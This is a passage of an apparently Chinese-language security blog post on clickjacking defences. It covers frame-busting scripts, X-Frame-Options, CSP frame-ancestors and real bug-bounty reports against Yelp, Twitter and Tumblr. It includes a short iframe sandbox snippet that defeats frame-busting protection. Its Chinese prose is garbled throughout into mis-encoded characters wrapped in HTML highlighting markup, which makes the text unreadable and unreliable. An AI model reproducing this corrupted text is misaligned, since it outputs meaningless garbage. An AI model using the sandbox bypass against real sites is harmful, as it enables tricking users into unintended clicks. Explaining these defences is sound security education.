windowã€‚</p>\n<p>èˆ‰å€‹ä¾‹å­å¥½äº†ï¼Œå‡è¨­ä»Šå¤©æˆ‘åœ¨ localhost æœ‰å€‹ index.htmlï¼Œè£¡é¢å¯«è‘—ï¼š</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>iframe</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>https://example.com<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>iframe</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>iframe</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>https://onedegree.hk<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>iframe</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>é‚£é—œä¿‚åœ–å°±æœƒæ˜¯é€™æ¨£ï¼š</p>\n<p><img src=\"/img/posts/huli/clickjacking-intro/top.png\" alt=\"window é—œä¿‚åœ–\"></p>\n<p>ç¶ è‰²è·Ÿé»ƒè‰²åˆ†åˆ¥æ˜¯å…©å€‹ä»¥ iframe è¼‰å…¥çš„ç¶²é ï¼Œä¹Ÿå°±æ˜¯å…©å€‹ä¸åŒçš„ windowï¼Œåœ¨é€™å…©å€‹ç¶²é è£¡é¢å¦‚æœå­˜å– <code>top</code> çš„è©±ï¼Œå°±æœƒæ˜¯ <code>localhost/index.html</code> çš„ window objectã€‚</p>\n<p>æ‰€ä»¥é€é <code>if (top !== self)</code> çš„æª¢æŸ¥ï¼Œå°±å¯ä»¥çŸ¥é“è‡ªå·±æ˜¯ä¸æ˜¯è¢«æ”¾åœ¨ iframe è£¡é¢ã€‚å¦‚æœæ˜¯çš„è©±ï¼Œå°±æ”¹è®Š top.locationï¼ŒæŠŠæœ€ä¸Šå±¤çš„ç¶²é å°å‘å…¶ä»–åœ°æ–¹ã€‚</p>\n<p>è½èµ·ä¾†å¾ˆç¾å¥½è€Œä¸”æ²’ä»€éº¼å•é¡Œï¼Œä½†å…¶å¯¦æœƒè¢« iframe çš„ <code>sandbox</code> å±¬æ€§ç¹éã€‚</p>\n<p>iframe å¯ä»¥è¨­ç½®ä¸€å€‹å±¬æ€§å«åš <code>sandbox</code>ï¼Œä»£è¡¨é€™å€‹ iframe çš„åŠŸèƒ½å—åˆ°é™åˆ¶ï¼Œå¦‚æœè¦æŠŠé™åˆ¶æ‰“é–‹å¿…é ˆæ˜ç¢ºæŒ‡å®šï¼Œå¯ä»¥æŒ‡å®šçš„å€¼åŒ…æ‹¬ï¼š</p>\n<ol>\n<li>allow-formsï¼Œå…è¨±æäº¤è¡¨å–®</li>\n<li>allow-scriptsï¼Œå…è¨±åŸ·è¡Œ JS</li>\n<li>allow-top-navigationï¼Œå…è¨±æ”¹è®Š top location</li>\n<li>allow-popupsï¼Œå…è¨±å½ˆå‡ºè¦–çª—</li>\n</ol>\n<p>ï¼ˆé‚„æœ‰ä¸€å¤§å †ï¼Œè©³æƒ…å¯åƒè€ƒ <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe\">MDN: iframe</a>ï¼‰</p>\n<p>ä¹Ÿå°±æ˜¯èªªï¼Œå¦‚æœæˆ‘æ˜¯é€™æ¨£è¼‰å…¥ iframe çš„ï¼š</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>iframe</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>./busting.html<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">sandbox</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>allow-forms allow-scripts<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></code></pre>\n<p>é‚£å°±ç®— busting.html æœ‰ä¸Šé¢æˆ‘èªªçš„é‚£å€‹é˜²è­·ä¹Ÿæ²’æœ‰ç”¨ï¼Œå› ç‚º JavaScript ä¸æœƒåŸ·è¡Œï¼Œæ‰€ä»¥é‚£æ®µ script å°±ä¸æœƒè·‘åˆ°ï¼Œä½† user é‚„æ˜¯å¯ä»¥æ­£å¸¸ submit è¡¨å–®ã€‚</p>\n<p>æ–¼æ˜¯å°±æœ‰äººæå‡ºäº†æ›´å¯¦ç”¨çš„æ–¹æ³•ï¼Œåœ¨ç¾æœ‰åŸºç¤ä¸Šåšä¸€äº›æ”¹è‰¯ï¼ˆç¨‹å¼ç¢¼å–è‡ªï¼š<a href=\"https://en.wikipedia.org/wiki/Framekiller\">Wikipedia - Framekiller</a>ï¼‰ï¼š</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\"><span class=\"token selector\">html</span><span class=\"token punctuation\">{</span><span class=\"token property\">display</span><span class=\"token punctuation\">:</span>none<span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><br>   <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>self <span class=\"token operator\">==</span> top<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>       document<span class=\"token punctuation\">.</span>documentElement<span class=\"token punctuation\">.</span>style<span class=\"token punctuation\">.</span>display <span class=\"token operator\">=</span> <span class=\"token string\">'block'</span><span class=\"token punctuation\">;</span> <br>   <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span><br>       top<span class=\"token punctuation\">.</span>location <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">;</span> <br>   <span class=\"token punctuation\">}</span><br></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>å…ˆæŠŠç¶²é æ•´å€‹è—èµ·ä¾†ï¼Œä¸€å®šè¦åŸ·è¡Œ JS æ‰èƒ½é–‹å•Ÿï¼Œæ‰€ä»¥ç”¨ä¸Šé¢çš„ sandbox é˜»æ­¢ script åŸ·è¡Œçš„è©±ï¼Œå°±åªæœƒçœ‹åˆ°ä¸€å€‹ç©ºç™½çš„ç¶²é ï¼›å¦‚æœä¸ç”¨ sandbox çš„è©±ï¼ŒJS çš„æª¢æŸ¥ä¸æœƒéï¼Œæ‰€ä»¥é‚„æ˜¯çœ‹åˆ°ä¸€ç‰‡ç©ºç™½ã€‚</p>\n<p>é›–ç„¶èªªé€™æ¨£å¯ä»¥åšåˆ°æ¯”è¼ƒå®Œå…¨çš„é˜²ç¦¦ï¼Œä½†ä¹Ÿæœ‰ç¼ºé»å­˜åœ¨ã€‚é€™å€‹ç¼ºé»å°±æ˜¯ï¼Œå¦‚æœä½¿ç”¨è€…æŠŠ JS åŠŸèƒ½é—œæ‰çš„è©±ï¼Œä»–å°±ä»€éº¼éƒ½çœ‹ä¸åˆ°äº†ã€‚æ‰€ä»¥å°æ–¼æŠŠ JS åŠŸèƒ½é—œé–‰çš„ä½¿ç”¨è€…ä¾†èªªï¼Œé«”é©—é‚„æ»¿å·®çš„ã€‚</p>\n<p>clickjacking æ—©æœŸå‡ºä¾†çš„æ™‚å€™ï¼ˆ2008 å¹´ï¼‰å¯èƒ½ç›¸é—œé˜²ç¦¦é‚„æ²’æœ‰é€™éº¼å®Œå…¨ï¼Œæ‰€ä»¥åªå¥½ç”¨é€™äº›æ–¹æ¡ˆï¼Œä½†åœ¨ç¾ä»Š 2021 å¹´ï¼Œç€è¦½å™¨å·²ç¶“æ”¯æ´äº†å…¶ä»–æ›´å¥½çš„æ–¹å¼ä¾†é˜»æ“‹ç¶²é è¢«åµŒå…¥ã€‚</p>\n<h3 id=\"x-frame-options\"><a class=\"direct-link\" href=\"#x-frame-options\">#</a> X-Frame-Options</h3>\n<p>é€™å€‹ HTTP response header åœ¨ 2009 å¹´æ™‚é¦–å…ˆç”± IE8 å¯¦ä½œï¼Œæ¥è‘—å…¶ä»–ç€è¦½å™¨æ‰è·Ÿä¸Šï¼Œåœ¨ 2013 å¹´æ™‚æ‰è®Šæˆäº†å®Œæ•´çš„ <a href=\"https://www.rfc-editor.org/rfc/rfc7034.txt\">RFC7034</a>ã€‚</p>\n<p>é€™å€‹ header æœƒæœ‰åº•ä¸‹é€™ä¸‰ç¨®å€¼ï¼š</p>\n<ol>\n<li>X-Frame-Options: DENY</li>\n<li>X-Frame-Options: SAMEORIGIN</li>\n<li>X-Frame-Options: ALLOW-FROM <a href=\"https://example.com/\">https://example.com/</a></li>\n</ol>\n<p>ç¬¬ä¸€ç¨®å°±æ˜¯æ‹’çµ•ä»»ä½•ç¶²é æŠŠé€™å€‹ç¶²é åµŒå…¥ï¼ŒåŒ…å« <code>&lt;iframe&gt;</code>, <code>&lt;frame&gt;</code>, <code>&lt;object&gt;</code>, <code>&lt;applet&gt;</code>, <code>&lt;embed&gt;</code> é€™äº› tag éƒ½ä¸è¡Œã€‚</p>\n<p>ç¬¬äºŒå€‹å‰‡æ˜¯åªæœ‰ same origin çš„ç¶²é å¯ä»¥ï¼Œæœ€å¾Œä¸€å€‹å‰‡æ˜¯åªå…è¨±ç‰¹å®šçš„ origin åµŒå…¥ï¼Œé™¤æ­¤ä¹‹å¤–å…¶ä»–çš„éƒ½ä¸è¡Œï¼ˆåªèƒ½æ”¾ä¸€å€‹å€¼ä¸èƒ½æ”¾åˆ—è¡¨ï¼Œæ‰€ä»¥å¦‚æœè¦å¤šå€‹ originï¼Œè¦åƒ CORS header é‚£æ¨£åœ¨ server å‹•æ…‹èª¿æ•´è¼¸å‡ºï¼‰ã€‚</p>\n<p>åœ¨ RFC è£¡é¢é‚„æœ‰ç‰¹åˆ¥æåˆ°æœ€å¾Œå…©ç¨®çš„åˆ¤å®šæ–¹å¼å¯èƒ½è·Ÿä½ æƒ³çš„ä¸ä¸€æ¨£ï¼Œæ¯å€‹ç€è¦½å™¨çš„å¯¦ä½œæœƒæœ‰å·®ç•°ã€‚</p>\n<p>ä¾‹å¦‚èªªæœ‰äº›ç€è¦½å™¨å¯èƒ½åªæª¢æŸ¥ã€Œä¸Šä¸€å±¤ã€è·Ÿã€Œæœ€ä¸Šå±¤ã€ï¼Œè€Œä¸æ˜¯æ¯ä¸€å±¤éƒ½æª¢æŸ¥ã€‚é€™å€‹ã€Œå±¤ã€æ˜¯ä»€éº¼æ„æ€å‘¢ï¼Ÿå› ç‚º iframe ç†è«–ä¸Šå¯ä»¥æœ‰ç„¡é™å¤šå±¤å˜›ï¼ŒA åµŒå…¥ B åµŒå…¥ C åµŒå…¥ D...</p>\n<p>å¦‚æœæŠŠé€™é—œä¿‚åŒ–ç‚ºé¡ä¼¼ html tag çš„è©±ï¼Œæœƒé•·å¾—åƒé€™æ¨£ï¼š</p>\n<pre><code>&lt;example.com/A.html&gt;\n  &lt;attacker.com&gt;\n    &lt;example.com/B.html&gt;\n        &lt;example.com/target.html&gt;\n</code></pre>\n<p>å°æ–¼æœ€å…§å±¤çš„ target.html ä¾†èªªï¼Œå¦‚æœç€è¦½å™¨åªæª¢æŸ¥ä¸Šä¸€å±¤ï¼ˆB.htmlï¼‰è·Ÿæœ€ä¸Šå±¤ï¼ˆA.htmlï¼‰çš„è©±ï¼Œé‚£å„˜ç®¡è¨­ç½®æˆ <code>X-Frame-Options: SAMEORIGIN</code>ï¼Œæª¢æŸ¥é‚„æ˜¯æœƒé€šéï¼Œå› ç‚ºé€™å…©å±¤ç¢ºå¯¦æ˜¯ç›¸åŒçš„ originã€‚ä½†å¯¦éš›ä¸Šï¼Œä¸­é–“å»å¤¾äº†ä¸€å€‹æƒ¡æ„ç¶²é åœ¨è£¡é¢ï¼Œæ‰€ä»¥é‚„æ˜¯æœ‰è¢«æ”»æ“Šçš„é¢¨éšªã€‚</p>\n<p>é™¤æ­¤ä¹‹å¤– <code>X-Frame-Options</code> é‚„æœ‰ç¬¬äºŒå€‹å•é¡Œï¼Œå°±æ˜¯ <code>ALLOW-FROM</code> çš„æ”¯æ´åº¦ä¸å¥½ï¼Œå¯ä»¥åƒè€ƒåº•ä¸‹ä¾†è‡ª <a href=\"https://caniuse.com/?search=X-Frame-Options\">caniuse</a> çš„è¡¨æ ¼ï¼Œé»ƒè‰²çš„éƒ½æ˜¯ä¸æ”¯æ´ <code>ALLOW-FROM</code> çš„ï¼š</p>\n<p><img src=\"/img/posts/huli/clickjacking-intro/caniuse.png\" alt=\"\"></p>\n<p><code>X-Frame-Options</code> æœ€å‰é¢çš„ <code>X</code> èªªæ˜äº†å®ƒæ¯”è¼ƒåƒæ˜¯ä¸€å€‹éæ¸¡æ™‚æœŸçš„æ±è¥¿ï¼Œåœ¨æœªä¾†æ–°çš„ç€è¦½å™¨ç•¶ä¸­ï¼Œå®ƒçš„åŠŸèƒ½æœƒè¢« CSPï¼ˆContent Security Policyï¼‰çµ¦å–ä»£ï¼Œä¸¦ä¸”æŠŠä¸Šé¢æåˆ°çš„å•é¡Œè§£æ±ºã€‚</p>\n<h3 id=\"csp%3A-frame-ancestors\"><a class=\"direct-link\" href=\"#csp%3A-frame-ancestors\">#</a> CSP: frame-ancestors</h3>\n<p>åœ¨ä¹‹å‰çš„æ–‡ç« ï¼š<a href=\"https://tech-blog.cymetrics.io/posts/huli/xss-attack-and-defense/\">æ·ºè«‡ XSS æ”»æ“Šèˆ‡é˜²ç¦¦çš„å„å€‹ç’°ç¯€</a>è£¡é¢æˆ‘æœ‰ç¨å¾®è¬›äº†ä¸€ä¸‹ CSP é€™å€‹æ±è¥¿ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯å‘Šè¨´ç€è¦½å™¨ä¸€äº›å®‰å…¨æ€§ç›¸é—œçš„è¨­ç½®ï¼Œå…¶ä¸­æœ‰ä¸€å€‹å±¬æ€§æ˜¯ <code>frame-ancestors</code>ï¼Œè¨­å®šèµ·ä¾†æœƒåƒé€™æ¨£ï¼š</p>\n<ol>\n<li>Content-Security-Policy: frame-ancestors 'none'</li>\n<li>Content-Security-Policy: frame-ancestors 'self'</li>\n<li>Content-Security-Policy: frame-ancestors <a href=\"https://a.example.com\">https://a.example.com</a> <a href=\"https://b.example.com\">https://b.example.com</a></li>\n</ol>\n<p>é€™ä¸‰ç¨®å‰›å¥½å°æ‡‰åˆ°äº†ä¹‹å‰ X-Frame-Options çš„ä¸‰ç¨®ï¼šDENY, SAMEORIGIN ä»¥åŠ ALLOW-FROMï¼ˆä½†é€™æ¬¡æœ‰æ”¯æ´å¤šå€‹ origin äº†ï¼‰ã€‚</p>\n<p>å…ˆè¬›ä¸€å€‹å¯èƒ½æœƒè¢«ææ··çš„åœ°æ–¹ï¼Œ<code>frame-ancestors</code> é™åˆ¶çš„è¡Œç‚ºè·Ÿ X-Frame-Options ä¸€æ¨£ï¼Œéƒ½æ˜¯ã€Œå“ªäº›ç¶²é å¯ä»¥æŠŠæˆ‘ç”¨ iframe åµŒå…¥ã€ï¼Œè€Œå¦å¤–ä¸€å€‹ CSP è¦å‰‡ <code>frame-src</code> å‰‡æ˜¯ï¼šã€Œæˆ‘é€™å€‹ç¶²é å…è¨±è¼‰å…¥å“ªäº›ä¾†æºçš„ iframeã€ã€‚</p>\n<p>ä¾‹å¦‚èªªæˆ‘åœ¨ index.html è¨­ä¸€å€‹è¦å‰‡æ˜¯ <code>frame-src: 'none'</code>ï¼Œé‚£ index.html è£¡é¢ç”¨ <code>&lt;iframe&gt;</code> è¼‰å…¥ä»»ä½•ç¶²é éƒ½æœƒè¢«æ“‹ä¸‹ä¾†ï¼Œä¸ç®¡é‚£å€‹ç¶²é æœ‰æ²’æœ‰è¨­ç½®ä»»ä½•æ±è¥¿ã€‚</p>\n<p>å†èˆ‰å€‹ä¾‹å­ï¼Œæˆ‘çš„ index.html è¨­ç½®æˆï¼š<code>frame-src: https://example.com</code>ï¼Œä½†æ˜¯ <a href=\"http://example.com\">example.com</a> ä¹Ÿæœ‰è¨­ç½®ï¼š<code>frame-ancestors: 'none'</code>ï¼Œé‚£ index.html é‚„æ˜¯æ²’æœ‰è¾¦æ³•ç”¨ iframe æŠŠ <a href=\"http://example.com\">example.com</a> è¼‰å…¥ï¼Œå› ç‚ºå°æ–¹æ‹’çµ•äº†ã€‚</p>\n<p>ç¸½è€Œè¨€ä¹‹ï¼Œ<code>frame-src</code> æ˜¯ã€Œè·Ÿæˆ‘äº¤å¾€å¥½å—ï¼Ÿã€ï¼Œ<code>frame-ancestors</code> å‰‡æ˜¯å°æ–¼é€™å€‹è«‹æ±‚çš„å›ç­”ã€‚æˆ‘å¯ä»¥è¨­ç½®æˆ <code>frame-ancestors: 'none'</code>ï¼Œä»£è¡¨ä»»ä½•äººä¾†è·Ÿæˆ‘å‘Šç™½æˆ‘éƒ½èªªä¸è¦ã€‚ç€è¦½å™¨è¦æˆåŠŸé¡¯ç¤º iframeï¼Œè¦å…©æ–¹éƒ½åŒæ„æ‰è¡Œï¼Œåªè¦å…¶ä¸­ä¸€æ–¹ä¸åŒæ„å°±æœƒå¤±æ•—ã€‚</p>\n<p>å¦å¤–ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ frame-ancestors æ˜¯ CSP level2 æ‰æ”¯æ´çš„è¦å‰‡ï¼Œåœ¨ 2014 å¹´å¹´åº•æ‰æ¼¸æ¼¸é–‹å§‹è¢«ä¸»æµç€è¦½å™¨å€‘æ‰€æ”¯æ´ã€‚</p>\n<h3 id=\"%E9%98%B2%E7%A6%A6%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E9%98%B2%E7%A6%A6%E7%B8%BD%E7%B5%90\">#</a> é˜²ç¦¦ç¸½çµ</h3>\n<p>å› ç‚ºæ”¯æ´åº¦çš„é—œä¿‚ï¼Œæ‰€ä»¥å»ºè­° <code>X-Frame-Options</code> è·Ÿ CSP çš„ <code>frame-ancestors</code>ä¸€èµ·ä½¿ç”¨ï¼Œè‹¥æ˜¯ä½ çš„ç¶²é ä¸æƒ³è¢« iframe è¼‰å…¥ï¼Œè¨˜å¾—åŠ ä¸Š HTTP response headerï¼š</p>\n<pre><code>X-Frame-Options: DENY\nContent-Security-Policy: frame-ancestors 'none'\n</code></pre>\n<p>è‹¥æ˜¯åªå…è¨±è¢« same origin è¼‰å…¥çš„è©±ï¼Œè¨­ç½®æˆï¼š</p>\n<pre><code>X-Frame-Options: SAMEORIGIN\nContent-Security-Policy: frame-ancestors 'self'\n</code></pre>\n<p>å¦‚æœè¦ç”¨ allow list æŒ‡å®šå…è¨±çš„ä¾†æºï¼Œå‰‡æ˜¯ï¼š</p>\n<pre><code>X-Frame-Options: ALLOW-FROM https://example.com/\nContent-Security-Policy: frame-ancestors https://example.com/\n</code></pre>\n<h2 id=\"%E5%AF%A6%E9%9A%9B%E6%A1%88%E4%BE%8B\"><a class=\"direct-link\" href=\"#%E5%AF%A6%E9%9A%9B%E6%A1%88%E4%BE%8B\">#</a> å¯¦éš›æ¡ˆä¾‹</h2>\n<p>æ¥è‘—æˆ‘å€‘ä¾†çœ‹ä¸€äº›å¯¦éš›çš„ clickjacking æ¡ˆä¾‹ï¼Œæœƒå°é€™å€‹æ”»æ“Šæ›´æœ‰æ„Ÿè¦ºä¸€é»ã€‚</p>\n<h3 id=\"yelp\"><a class=\"direct-link\" href=\"#yelp\">#</a> Yelp</h3>\n<p>ç¾åœ‹æœ€å¤§çš„é¤å»³è©•è«–ç¶²ç«™ Yelp æœ‰å¹¾å€‹é—œæ–¼ clickjacking çš„ reportï¼š</p>\n<ol>\n<li><a href=\"https://hackerone.com/reports/305128\">ClickJacking on IMPORTANT Functions of Yelp</a></li>\n<li><a href=\"https://hackerone.com/reports/355859\">CRITICAL-CLICKJACKING at Yelp Reservations Resulting in exposure of victim Private Data (Email info) + Victim Credit Card MissUse.</a></li>\n</ol>\n<p>é›–ç„¶èªªæ²’è¾¦æ³•é”åˆ°å¥ªå–å¸³è™Ÿé€™ç¨®å¾ˆåš´é‡çš„æ”»æ“Šï¼Œä½†é‚„æ˜¯å¯ä»¥é€ æˆä¸€äº›å±å®³ï¼Œä¾‹å¦‚èªªè‡ªå·±è¨»å†Šä¸€é–“é¤å»³ä¹‹å¾Œï¼š</p>\n<ol>\n<li>å¹«ä½¿ç”¨è€…è¨‚ä½ï¼Œè—‰æ­¤å·åˆ°ä»–å€‘çš„ email</li>\n<li>å¹«ä½¿ç”¨è€…è¨‚ä½ï¼Œä½¿ç”¨è€…è¦å–æ¶ˆè¨‚ä½çš„è©±å°±è¦ä»˜å–æ¶ˆè¨‚ä½çš„è²»ç”¨ï¼Œé€ æˆéŒ¢è²¡æå¤±</li>\n</ol>\n<p>å°æ–¼çœ‹ä¸çˆ½çš„é¤å»³ï¼Œä¹Ÿå¯ä»¥é é€™æ–¹æ³•å»è£½é€ å¾ˆå¤šå‡çš„è¨‚ä½ï¼Œè®“é¤å»³ç„¡å¾è¾¨åˆ¥ï¼ˆå› ç‚ºéƒ½æ˜¯çœŸçš„ä½¿ç”¨è€…ä¾†è¨‚ä½ï¼‰</p>\n<h3 id=\"twitter-periscope-clickjacking-vulnerability\"><a class=\"direct-link\" href=\"#twitter-periscope-clickjacking-vulnerability\">#</a> Twitter Periscope Clickjacking Vulnerability</h3>\n<p>åŸå§‹å ±å‘Šï¼š<a href=\"https://hackerone.com/reports/591432\">https://hackerone.com/reports/591432</a><br>\næ—¥æœŸï¼š2019 å¹´ 5 æœˆ</p>\n<p>é€™å€‹ bug æ˜¯å› ç‚ºç›¸å®¹æ€§å•é¡Œï¼Œç¶²é åªè¨­ç½®äº† <code>X-Frame-Options ALLOW-FROM</code> è€Œæ²’æœ‰è¨­ç½® CSPï¼Œé€™æ¨£çš„è©±å…¶å¯¦æ²’ä»€éº¼ç”¨ï¼Œå› ç‚ºç¾åœ¨çš„ç€è¦½å™¨éƒ½ä¸æ”¯æ´ <code>ALLOW-FROM</code>ã€‚</p>\n<p>è§£æ³•å¾ˆç°¡å–®ï¼Œå°±æ˜¯åŠ ä¸Š CSP çš„ frame-ancestorsï¼Œè®“ç¾ä»£ç€è¦½å™¨ä¹Ÿéµå®ˆé€™å€‹è¦å‰‡ã€‚</p>\n<h3 id=\"highly-wormable-clickjacking-in-player-card\"><a class=\"direct-link\" href=\"#highly-wormable-clickjacking-in-player-card\">#</a> Highly wormable clickjacking in player card</h3>\n<p>åŸå§‹å ±å‘Šï¼š<a href=\"https://hackerone.com/reports/85624\">https://hackerone.com/reports/85624</a><br>\næ—¥æœŸï¼š2015 å¹´ 8 æœˆ</p>\n<p>é€™å€‹æ¼æ´æ»¿æœ‰è¶£çš„ï¼Œé‹ç”¨äº†å‰é¢æ‰€æåˆ°çš„ç€è¦½å™¨å¯¦ä½œå•é¡Œã€‚é€™å€‹æ¡ˆä¾‹æ˜¯ twitter å·²ç¶“æœ‰è¨­ç½® <code>X-Frame-Options: SAMEORIGIN</code> è·Ÿ <code>Content-Security-Policy: frame-ancestors 'self'</code>ï¼Œä½†ç•¶æ™‚æœ‰äº›ç€è¦½å™¨å¯¦ä½œæª¢æŸ¥æ™‚ï¼Œåªæª¢æŸ¥ top window æ˜¯ä¸æ˜¯ç¬¦åˆæ¢ä»¶ã€‚</p>\n<p>æ›å¥è©±èªªï¼Œå¦‚æœæ˜¯ <a href=\"http://twitter.com\">twitter.com</a> =&gt; <a href=\"http://attacker.com\">attacker.com</a> =&gt; <a href=\"http://twitter.com\">twitter.com</a>ï¼Œå°±æœƒé€šéæª¢æŸ¥ï¼Œæ‰€ä»¥é‚„æ˜¯å¯ä»¥è¢«æƒ¡æ„ç¶²é åµŒå…¥ã€‚</p>\n<p>å†åŠ ä¸Šé€™å€‹æ¼æ´ç™¼ç”Ÿåœ¨ twitter çš„ timelineï¼Œæ‰€ä»¥å¯ä»¥é”æˆè •èŸ²çš„æ•ˆæœï¼Œclickjacking ä¹‹å¾Œå°±ç™¼æ¨ï¼Œç„¶å¾Œå°±æœƒæœ‰æ›´å¤šäººçœ‹åˆ°ï¼Œæ›´å¤šäººç™¼åŒæ¨£çš„æ¨æ–‡ã€‚</p>\n<p>ä½œè€…çš„ writeup å¯«å¾—å¾ˆæ£’ï¼Œä½†éƒ¨è½æ ¼æ›æ‰äº†ï¼Œé€™æ˜¯å­˜æª”ï¼š<a href=\"http://web.archive.org/web/20190310161937/https://blog.innerht.ml/google-yolo/\">Google YOLO</a></p>\n<h3 id=\"%5Bapi.tumblr.com%5D-exploiting-clickjacking-vulnerability-to-trigger-self-dom-based-xss\"><a class=\"direct-link\" href=\"#%5Bapi.tumblr.com%5D-exploiting-clickjacking-vulnerability-to-trigger-self-dom-based-xss\">#</a> [<a href=\"http://api.tumblr.com\">api.tumblr.com</a>] Exploiting clickjacking vulnerability to trigger self DOM-based XSS</h3>\n<p>åŸå§‹å ±å‘Šï¼š<a href=\"https://hackerone.com/reports/953579\">https://hackerone.com/reports/953579</a><br>\næ—¥æœŸï¼š2020 å¹´ 8 æœˆ</p>\n<p>æœƒç‰¹åˆ¥æŒ‘é€™å€‹æ¡ˆä¾‹ï¼Œæ˜¯å› ç‚ºå®ƒæ˜¯æ”»æ“ŠéŠçš„ä¸²æ¥ï¼</p>\n<p>åœ¨ XSS æ¼æ´ä¸­æœ‰ä¸€ç¨®å«åš self XSSï¼Œæ„æ€å°±æ˜¯é€šå¸¸éƒ½è¦ä½¿ç”¨è€…è‡ªå·±åšä¸€äº›æ“ä½œæ‰æœƒä¸­æ‹›ï¼Œæ‰€ä»¥å½±éŸ¿ååˆ†æœ‰é™ï¼Œè¨±å¤š program ä¹Ÿéƒ½ä¸æ¥å— self XSS çš„æ¼æ´ã€‚</p>\n<p>è€Œé€™ä»½å ±å‘ŠæŠŠ self XSS è·Ÿ clickjacking ä¸²é€£åœ¨ä¸€èµ·ï¼Œé€é clickjacking çš„æ–¹å¼è®“ä½¿ç”¨è€…å»è§¸ç™¼ self XSSï¼Œä¸²é€£æ”»æ“ŠéŠè®“é€™å€‹æ”»æ“Šæ›´å®¹æ˜“è¢«é”æˆï¼Œå¯è¡Œæ€§æ›´é«˜ã€‚</p>\n<p>ä»¥ä¸Šå°±æ˜¯ä¸€äº› clickjacking ç›¸é—œçš„å¯¦éš›æ¡ˆä¾‹ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯æœ‰ä¸€äº›æ˜¯å› ç‚ºç›¸å®¹æ€§å•é¡Œé€ æˆçš„ issueï¼Œè€Œä¸æ˜¯æ²’æœ‰è¨­å®šï¼Œæ‰€ä»¥è¨­å®šæ­£ç¢ºä¹Ÿæ˜¯å¾ˆé‡è¦çš„ä¸€ä»¶äº‹ã€‚</p>\n<h2 id=\"%E7%84%A1%E6%B3%95%E9%98%B2%E7%A6%A6%E7%9A%84-clickjacking%EF%BC%9F\"><a class=\"direct-link\" href=\"#%E7%84%A1%E6%B3%95%E9%98%B2%E7%A6%A6%E7%9A%84-clickjacking%EF%BC%9F\">#</a> ç„¡æ³•é˜²ç¦¦çš„ clickjackingï¼Ÿ</h2>\n<p>clickjacking é˜²ç¦¦çš„æ–¹å¼èªªç©¿äº†å°±æ˜¯ä¸è¦è®“åˆ¥äººå¯ä»¥åµŒå…¥ä½ çš„ç¶²é ï¼Œä½†å¦‚æœé€™å€‹ç¶²é çš„ç›®çš„å°±æ˜¯è®“åˆ¥äººåµŒå…¥ï¼Œé‚£è©²æ€éº¼è¾¦ï¼Ÿ</p>\n<p>ä¾‹å¦‚èªª Facebook widgetï¼Œå¤§å®¶å¸¸çœ‹åˆ°çš„é‚£äº›ã€Œè®šã€è·Ÿã€Œåˆ†äº«ã€çš„æŒ‰éˆ•ï¼Œå°±æ˜¯ç‚ºäº†è®“å…¶ä»–äººå¯ä»¥ç”¨ iframe åµŒå…¥çš„ï¼Œé€™é¡å‹çš„ widget è©²æ€éº¼è¾¦å‘¢ï¼Ÿ</p>\n<p>æ ¹æ“šé€™å…©ç¯‡ï¼š</p>\n<ol>\n<li><a href=\"https://www.netsparker.com/blog/web-security/clickjacking-attack-on-facebook-how-tiny-attribute-save-corporation/\">Clickjacking Attack on Facebook: How a Tiny Attribute Can Save the Corporation</a></li>\n<li><a href=\"https://stackoverflow.com/questions/61968091/facebook-like-button-click\">Facebook like button click</a></li>\n</ol>\n<p>è£¡é¢å¾—åˆ°çš„è³‡è¨Šï¼Œæˆ–è¨±ç›®å‰åªèƒ½é™ä½ä¸€é»ä½¿ç”¨è€…é«”é©—ä¾†æ›å–å®‰å…¨æ€§ï¼Œä¾‹å¦‚èªªé»äº†æŒ‰éˆ•ä¹‹å¾Œé‚„æœƒè·³å‡ºä¸€å€‹ popup è®“ä½ ç¢ºèªï¼Œå°ä½¿ç”¨è€…ä¾†èªªå¤šäº†ä¸€å€‹é»æ“Šï¼Œä½†æ˜¯ä¹Ÿé¿å…äº† likejacking 